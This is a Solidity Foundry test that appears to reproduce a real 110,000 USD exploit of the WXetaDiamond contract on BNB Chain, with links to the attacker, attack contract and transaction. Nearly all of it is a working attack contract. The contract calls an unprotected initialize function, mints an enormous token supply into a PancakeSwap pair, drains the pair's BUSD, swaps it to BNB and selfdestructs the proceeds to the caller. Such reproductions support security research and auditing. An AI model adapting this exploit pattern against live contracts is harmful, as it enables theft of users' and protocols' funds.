
// @KeyInfo - Total Lost : 110,000 USD
// Attacker : https://bscscan.com/address/0x57ecf40b596274a985967e3f698437ae0a9600a0
// Attack Contract : https://bscscan.com/address/0x11bffb96daa9b0c47fef01401eb089549e87604e
// Vulnerable Contract : https://bscscan.com/address/0x05c2dd9cf547c6cccf91245346e6e1bc9926cae7
// Attack Tx : https://bscscan.com/tx/0x614da880bd46e98131accd9a83917abf3d56dac94caf13ae98eeff504eea3704

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x05c2dd9cf547c6cccf91245346e6e1bc9926cae7#code
// @Analysis

// Post-mortem : https://x.com/TenArmorAlert/status/1835494807495659645
// Twitter Guy : https://x.com/TenArmorAlert/status/1835494807495659645
// Hacking God : N/A

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

address constant WXetaDiamond = 0x05c2dD9cf547C6cCCF91245346E6E1BC9926cae7;
address constant PancakePair = 0xF5a32e5E54a771B9d3C853143db74449B721C03B;
address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant BEP20Token = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
address constant addr1 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant addr2 = 0x4848489f0b2BEdd788c696e2D79b6b69D7484848;
address constant attacker = 0x57ecF40B596274a985967e3F698437aE0a9600A0;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 42284161);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0x11Bffb96DAa9b0C47FEf01401eb089549e87604E
contract AttackerC {
    constructor() {
        IWXetaDiamond(WXetaDiamond).initialize(type(uint256).max);
        bool minted = IWXetaDiamond(WXetaDiamond).mint(PancakePair, 1000000000000000 * 1e18);
    
        uint256 balPair = IBEP20Token(BEP20Token).balanceOf(PancakePair);
        (bool s1,) = PancakePair.call(abi.encodeWithSelector(
            bytes4(keccak256("swap(uint256,uint256,address,bytes)")),
            0, balPair - 1e18, address(this), bytes("")
        ));
        require(s1);
        bool ok = IBEP20Token(BEP20Token).approve(PancakeRouter, type(uint256).max);
    
        uint256 bal = IBEP20Token(BEP20Token).balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = BEP20Token;
        path[1] = addr1;
        (bool s2,) = PancakeRouter.call(
            abi.encodeWithSelector(
                bytes4(keccak256("swapExactTokensForETH(uint256,uint256,address[],address,uint256)")),
                bal, 0, path, address(this), block.timestamp
            )
        );
        require(s2);
        payable(addr2).call{value: 10**16}("");
        selfdestruct(payable(msg.sender));
    }
}

interface IWXetaDiamond {
	function mint(address, uint256) external returns (bool);
	function initialize(uint256) external; 
}

interface IBEP20Token {
	function balanceOf(address) external returns (uint256);
	function approve(address, uint256) external returns (bool); 
}